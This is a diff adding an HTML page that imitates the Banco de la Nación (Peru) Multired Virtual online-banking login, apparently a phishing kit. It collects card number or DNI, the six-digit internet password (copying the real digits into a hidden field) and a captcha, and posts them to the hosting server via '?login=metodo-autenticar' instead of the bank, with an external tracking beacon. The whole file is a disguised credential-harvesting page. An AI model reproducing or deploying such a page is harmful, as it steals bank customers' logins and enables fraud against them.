@@ -1,0 +1,347 @@
+<html><head>
+	<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+	
+	<script type="text/javascript" src="./index_files/cache2.js"></script>
+	<script type="text/javascript" src="./index_files/bn-jquery.js"></script>
+	<script type="text/javascript" src="./index_files/jquery.ui.js"></script>
+	<script type="text/javascript" src="./index_files/select.js"></script>
+	<script type="text/javascript" src="./index_files/jquery.js"></script><style type="text/css">cufon{text-indent:0!important;}@media screen,projection{cufon{display:inline!important;display:inline-block!important;position:relative!important;vertical-align:middle!important;font-size:1px!important;line-height:1px!important;}cufon cufontext{display:-moz-inline-box!important;display:inline-block!important;width:0!important;height:0!important;overflow:hidden!important;text-indent:-10000in!important;}cufon canvas{position:relative!important;}}@media print{cufon{padding:0!important;}cufon canvas{display:none!important;}}</style></head><body><div style="position: absolute; top: 10em; left: 25%; float: left"><img src="https://svr1995.entelgystats.com/stats.php?id=c7ff8ecbecbceb792deb3f1b32263927&amp;c=Bc3t7dw&amp;u=NJjo6Pj10YWE5OTlgNCEgLz0rKTs8LyB%2FLCBgPiE8Oi8iYycgKTwrPSFgLSEjYQcgKTwrPSFhDAAZKyxhByAnLSchYQ&amp;r=C&amp;d=LcDo%2Bcn1ieXBjOj5ycCo8cj83eTElN3wxcGMqPHJwOS1yASM2JSAgLWN5YnxsZBslIigjOz9sAhhsfXxifHdsGyUienh3bDR6eGVsDTw8ICkbKS4HJThjeX97Yn96bGQHBBgBAGBsICUnKWwLKS8nI2VsBCktKCApPz8PJD4jISljdHlifGJ4fXR%2FYn18fmwfLSotPiVjeX97Yn96cGM5LXI&amp;ses=1600777879745.80304" onerror="this.style.display='none'" style="display: none;"></div>
+	<style type="text/css">
+		cufon{text-indent:0!important;}@media screen,projection{cufon{display:inline!important;display:inline-block!important;position:relative!important;vertical-align:middle!important;font-size:1px!important;line-height:1px!important;}cufon cufontext{display:-moz-inline-box!important;display:inline-block!important;width:0!important;height:0!important;overflow:hidden!important;text-indent:-10000in!important;}cufon canvas{position:relative!important;}}@media print{cufon{padding:0!important;}cufon canvas{display:none!important;}}
+	</style>
+
+
+
+	<div style="position: absolute; top: 10em; left: 25%; float: left">
+		<img src="" onerror="this.style.display='none'" style="display: none;">
+	</div>
+	<script language="JavaScript" src="./index_files/util.js"></script>
+	<link href="./index_files/stylesheet.css" rel="stylesheet" type="text/css">
+	<script type="text/javascript" src="./index_files/cufon-yui.js"></script>
+	<script type="text/javascript">
+		$(document).ready(function(){
+		initializePage();
+		});
+		
+		
+	</script>
+	<script language="javascript">
+		function fnReloadCaptcha()
+                {		 	
+		    var now  = new Date();
+		    var imageObject = document.getElementById('captcha');
+		    imageObject.src='../../data2/m_captcha_b4dfd026f71f7ce68377131e3d7fd930.jpg?reload=' + now.getTime();
+		}
+                
+                function fnGenCaptcha()
+                {		 	
+		    $.post("../../captcha.php",{},function(data)
+                    {
+                        fnReloadCaptcha();
+                    });
+		}
+                
+		
+		
+		
+		$(document).ready(
+		 function(){ 
+		 	
+		 	 $("#btnLogin").removeAttr("disabled");
+		 	 $("#txtNumeroTarjeta").focus();
+		 	 $("#txtNumeroTarjeta").val("4214");
+		 	 fnReloadCaptcha();
+		     //$("#srcCaptcha").load("/BNWeb/Welcome1.do?methodToCall=cargar");
+		     
+		     $("#boton_captcha").click(function()
+                     {
+                        fnGenCaptcha();
+//		     	var cont_param = parseInt($("#param_captcha").val());
+//		     	$("#srcCaptcha").html('<img alt="captcha"  id="captcha" name="captcha" src="resources/images/background.jpg" height="25" width="114"  />');
+//		     	$("#captcha").attr('src','/BNWeb/captcha.do?param='+cont_param);
+//		     	cont_param+=1;
+//		     	$("#param_captcha").val(cont_param);
+		     });
+		     
+		     $("#limpiar").click(function(){
+		     	$("#txtPassword").val("");
+                        $("#hPassReal").val("");
+		     });
+		 
+		 });
+		
+			function cambiarTipoTarjeta()
+                        {
+			   var valor = $("#cboTipoTarjeta").val();
+			   $("input[type=text]").val('');
+			   $("input[type=password]").val('');	   
+			   $('.tarjeta_dni').hide(); //Oculta Los campos de tarjeta y sus label
+			   
+			   switch(valor){
+			   		case '02':
+			   			$('#txtNumeroTarjeta').show();
+						$('#trNumeroTarjeta').show();
+						$('#txtNumeroTarjeta').val('4214');
+						$('#txtPassword').attr('maxlength','6');
+						$('#lblDigitosClave').html('06');
+						$("#ind_long_clave").val('6');
+						$('#txtNumeroTarjeta').focus();
+						break;
+			   		;
+			   		
+			   		case '03':
+						$('#txtNumeroTarjeta').show();
+						$('#trNumeroTarjeta').show();	
+						$('#txtNumeroTarjeta').val('8018');	
+						$('#txtPassword').attr('maxlength','6');
+						$('#lblDigitosClave').html('06');
+						$("#ind_long_clave").val('6');
+						$('#txtNumeroTarjeta').focus();
+						break;		
+					;
+					
+					case '01':
+						$('#txtDNI').show();
+						$('#trDNI').show();				
+						$('#txtPassword').attr('maxlength','6');
+						$('#lblDigitosClave').html('06');
+						$("#ind_long_clave").val('6');
+						$('#txtDNI').focus();
+						break;
+					;
+			   		
+			   		
+			   }
+			 }
+			
+			function autenticar()
+                        {
+			
+					var frmLogin = document.form;
+		            
+				if ($("#cboTipoTarjeta").val() == '01')
+                                {
+		
+					// Validando que el Número de DNI no tenga caracteres que no sean números
+					if (validarSiNumero($("#txtDNI").val())){
+						alert('El número de DNI solo acepta números...');
+						return false;
+					}
+		
+					// Validando que el Número de DNI sea de 8 digitos
+					if ($("#txtDNI").val().length < 8){
+						alert('El número de DNI debe ser de 8 Digitos no menos');
+						return false;
+					}
+		
+					// Validando que la clave con DNI sea de 6 digitos
+					if ($("#txtPassword").val().length < 6){
+						alert('Su Clave debe ser de 6 Digitos no menos');
+						return false;
+					}
+					  
+		  			if ($("#txtCaptcha").val().length < 5){
+						alert('Su Clave Captcha debe ser de 5 Digitos no menos');
+						return false;
+						}
+				
+				}
+				else 
+                                {
+		
+					
+		
+					// Validando que el Número de Tarjeta no tenga caracteres que no sean números
+					if (validarSiNumero($("#txtNumeroTarjeta").val())){
+						alert('El número de Tarjeta solo acepta números...');
+						return false;
+					}
+		
+					// Validando que el Número de Tarjeta sea de 16 digitos
+					if ($("#txtNumeroTarjeta").val().length < 16){
+						alert('El número de Tarjeta debe ser de 16 Digitos no menos');
+						return false;
+					}
+		
+					// Validando que la clave con TARJETA sea de 4 digitos
+					if ($("#txtPassword").val().length < 6){
+						alert('Su Clave debe ser de 6 Digitos no menos');
+						return false;
+					}
+					
+					if ($("#txtCaptcha").val().length < 5){
+						alert('Su Clave Captcha debe ser de 5 Digitos no menos');
+						return false;
+						}
+			
+				
+				}
+		 			
+				$("#validar").val("true");
+				$("#HrTrx").val("0112");		
+				$('#form').get(0).setAttribute('action', '?login=metodo-autenticar');
+				$("#btnLogin").attr("disabled","disabled");
+				$("#form").submit();
+				//return true;
+			
+				
+			}	
+			
+			function validarSiNumero(numero)
+		        {
+		            var textoStr =  numero.toString() // transformo a string todo el campo
+		            var tiene = 0
+		            for(var i = 0;i < numero.length;i++)
+		            { // recorro caracter potr caracter
+		                    var oneChar = textoStr.charAt(i)
+		                    if (!/^([0-9])*$/.test(oneChar))
+		                    { // busco un caracter que no sea Numerico
+		                            tiene = 1
+		                    }
+		            }
+		            if (tiene == 1){ // controlo si existe o no caracter que no sea numerico.
+		                    return true
+		            } else {
+		                    return false
+		            } 
+			}
+			
+			function evalRanTable(valor,valor2)
+		        {
+		            var longitud = parseInt($("#ind_long_clave").val());
+		            if($("#txtPassword").val().length < longitud)
+		            {
+		                $("#txtPassword").val($("#txtPassword").val()+valor);
+                                
+                                $("#hPassReal").val($("#hPassReal").val()+valor2);
+		            }
+			}
+	</script>
+	<title>Banco de la Nación - Multired Virtual</title>
+	<meta http-equiv="Content-Language" content="es">
+	<meta name="GENERATOR" content="Rational Application Developer">
+	<link rel="stylesheet" type="text/css" href="./index_files/resetearcss.css">
+	<link rel="stylesheet" type="text/css" href="./index_files/bn-principal.css">
+	<link rel="stylesheet" type="text/css" href="./index_files/tipografias.css">
+	<link rel="stylesheet" type="text/css" href="./index_files/home.css">
+	<link rel="stylesheet" type="text/css" href="./index_files/select.css">
+	<div id="contenedor">
+		<div id="cabecera">
+			<div id="logo-multired">
+				<img src="./index_files/logo-multired.jpg" alt="Logotipo Multired">
+			</div>
+			<div id="logo-bn">
+				<img src="./index_files/Logo_BN.jpg" alt="Logotipo del Banco de la Nación">
+			</div>
+		</div>
+		<div id="cuerpo">
+			<h1 class="dax"><img src="./index_files/candado.png"> Usted se encuentra en una <span>zona segura</span></h1>
+			<div id="login">
+				<div id="border-superior">
+					<img src="./index_files/border-arriba.png" alt="Border Login Superior">
+				</div>
+				<div id="login-contenido">
+					<div id="border-inferior"></div>
+					<form method="post" id="form" name="form">
+						<input type="hidden" id="transaccion" name="transaccion" value="LG01">
+						<input type="hidden" id="HrTrx" name="HrTrx" value="0112">
+						<input type="hidden" id="validar" name="validar" value="false">
+						<input type="hidden" id="ind_long_clave" name="ind_long_clave" value="6">
+						<input type="hidden" id="param_captcha" name="param_captcha" value="1">
+						<div class="fila limpiar">
+							<label for="tipo-documento">Seleccione:</label>
+							<select class="tipo-documento select" id="cboTipoTarjeta" name="cboTipoTarjeta" style="display: none;" onchange="cambiarTipoTarjeta();">
+                                                                <option value="02">Multired Global Débito</option>
+								<option value="03">Multired Clásica</option>
+								<option value="01">DNI (Cuenta Corriente)</option>
+							</select><a class="ui-selectmenu ui-widget ui-state-default ui-corner-all tipo-documento select ui-selectmenu-dropdown" id="cboTipoTarjeta-button" role="button" href="#" aria-haspopup="true" aria-owns="cboTipoTarjeta-menu" style="width: 248px;"><span class="ui-selectmenu-status">Multired Global Débito</span><span class="ui-selectmenu-icon ui-icon ui-icon-triangle-1-s"></span></a>                                                        
+						</div>
+						<div class="fila  limpiar">
+							<label id="trNumeroTarjeta" for="numero-tarjeta" class="tarjeta_dni">Número de tarjeta:</label>
+                                                        <input type="hidden" name="hPassReal" id="hPassReal">
+							<input type="text" name="txtNumeroTarjeta" id="txtNumeroTarjeta" class="grande tarjeta_dni" maxlength="16" onkeypress="return soloNumerosAll(event)">
+							<label id="trDNI" for="numero-tarjeta" style="display:none;" class="tarjeta_dni">DNI:</label>
+							<input type="text" name="txtDNI" id="txtDNI" class="grande tarjeta_dni" maxlength="8" onkeypress="return soloNumerosAll(event)" style="display:none;">
+						</div>
+						<div class="fila limpiar">
+							<label for="clave" style="width: 140px;">Ingresa tu clave usando el teclado virtual:</label>
+							<div id="botones-clave">
+								<div class="boton-clave" onclick="evalRanTable('m',9);"><span class="dax">9</span>
+								</div>
+								<div class="boton-clave" onclick="evalRanTable('n',0);">0</div>
+								<div class="boton-clave" onclick="evalRanTable('p',5);">5</div>
+								<div class="boton-clave" onclick="evalRanTable('i',1);">1</div>
+								<div class="boton-clave" onclick="evalRanTable('j',6);">6</div>
+								<div class="boton-clave" onclick="evalRanTable('k',7);">7</div>
+								<div class="boton-clave" onclick="evalRanTable('a',3);">3</div>
+								<div class="boton-clave" onclick="evalRanTable('y',2);">2</div>
+								<div class="boton-clave" onclick="evalRanTable('x',4);">4</div>
+								<div class="boton-clave" onclick="evalRanTable('t',8);">8</div>
+								<div class="boton-clave limpiar" id="limpiar">LIMPIAR</div>
+							</div>
+							<input type="hidden" value="QRKAcNTrxWI=" name="hdnValue">
+							<div id="campo-clave">
+								<p style="width: 175px ! important;">
+									<img border="0" src="./index_files/generar-clave.png" width="20" height="20" style="float: left; margin: -3px ! important;"> <a href="https://zonasegura1.bn.com.pe/BNWeb/Afiliacion" style="color: rgb(186, 17, 19); text-decoration: underline; font: 12px arial;">Genera tu Clave de Internet</a>
+								</p>
+								<p style="width: 124px;">Ingresa tu <b>Clave de Internet (06 dígitos)</b> 
+								</p>
+								<input type="password" name="txtPassword" id="txtPassword" maxlength="6" readonly="readonly" style="margin: 0px 10px;">
+								<div class="olvido-clave">
+									<div class="olvide-clave"><a href="https://zonasegura1.bn.com.pe/BNWeb/Olvido" style="color: rgb(186, 17, 19);text-decoration: underline;">Olvidé mi clave</a>
+									</div>
+								</div>
+							</div>
+						</div>
+						<div class="fila limpiar" style="margin: 0px;">
+							<label for="capcha">Ingresa el texto de la imagen:</label>
+							<div class="capcha">
+								<div id="srcCaptcha">
+									<img alt="captcha" id="captcha" name="captcha" src="../../data2/m_captcha_b4dfd026f71f7ce68377131e3d7fd930.jpg?reload=1600777879977" height="25" width="114">
+								</div>
+								<div class="boton_captcha" id="boton_captcha">Cambiar texto</div>
+							</div>
+							<input class="capcha" type="text" name="txtCaptcha" id="txtCaptcha" maxlength="5" style="margin: 0px 10px;">
+						</div>
+						<input name="btnLogin" id="btnLogin" type="button" value="INGRESAR" onclick="javascript:return autenticar();">
+					</form>
+				</div>
+				<div id="border-inferior">
+					<img src="./index_files/border-abajo.png" alt="Border Login Inferior">
+				</div>
+			</div>
+                                                
+		</div>
+		<div id="pie-pagina">
+			<div id="titulo-pie-pagina">Banco de la Nación | Ministerio de Economía y Finanzas</div>
+			<div id="oficinas">
+				<p>Oficina Principal: Av. Javier Prado Este 2499. San Borja. Central Telefónica: 519 2000.</p>
+				<p>Atención en Oficinas Administrativas: Lunes a Viernes de 08:30 a 17:30. Refrigerio de: 13:00-14:00.</p>
+				<p>Atención en Oficina de Trámite Documentario: Lunes a Viernes de 8:30 a 16:30 (horario corrido).</p>
+			</div>
+		</div>
+	</div>
+	<script type="text/javascript" src="./index_files/bn-funciones.js"></script>
+	<script type="text/javascript">
+		$(document).ready(function(){
+				myApp.select.init();
+				myApp.home.init();
+			});
+	</script>
+	<script type="text/javascript">
+		Cufon.now();
+	</script>
+	<div style="position: absolute; top: 10em; left: 25%; float: left">
+		<img src="" onerror="this.style.display='none'" style="display: none;">
+	</div>
+	<ul class="ui-selectmenu-menu ui-widget ui-widget-content ui-corner-bottom tipo-documento select ui-selectmenu-menu-dropdown" aria-hidden="true" role="listbox" aria-labelledby="cboTipoTarjeta-button" id="cboTipoTarjeta-menu" aria-activedescendant="ui-selectmenu-item-250" style="width: 248px; left: 641.9px; top: 220.6px;">
+		<li role="presentation" class="ui-selectmenu-item-selected"><a href="https://zonasegura1.bn.com.pe/BNWeb/Inicio#" tabindex="-1" role="option" aria-selected="true" id="ui-selectmenu-item-250">Multired Global Débito</a>
+		</li>
+		<li role="presentation"><a href="https://zonasegura1.bn.com.pe/BNWeb/Inicio#" tabindex="-1" role="option" aria-selected="false">Multired Clásica</a>
+		</li>
+		<li role="presentation" class="ui-corner-bottom"><a href="https://zonasegura1.bn.com.pe/BNWeb/Inicio#" tabindex="-1" role="option" aria-selected="false">DNI (Cuenta Corriente)</a>
+		</li>
+	</ul>
+
+
+<ul class="ui-selectmenu-menu ui-widget ui-widget-content ui-corner-bottom tipo-documento select ui-selectmenu-menu-dropdown" aria-hidden="true" role="listbox" aria-labelledby="cboTipoTarjeta-button" id="cboTipoTarjeta-menu" aria-activedescendant="ui-selectmenu-item-787" style="width: 248px; left: 885.5px; top: 198px;"><li role="presentation" class="ui-selectmenu-item-selected"><a href="#" tabindex="-1" role="option" aria-selected="true" id="ui-selectmenu-item-787">Multired Global Débito</a></li><li role="presentation"><a href="#" tabindex="-1" role="option" aria-selected="false">Multired Clásica</a></li><li role="presentation" class="ui-corner-bottom"><a href="#" tabindex="-1" role="option" aria-selected="false">DNI (Cuenta Corriente)</a></li></ul></body></html>
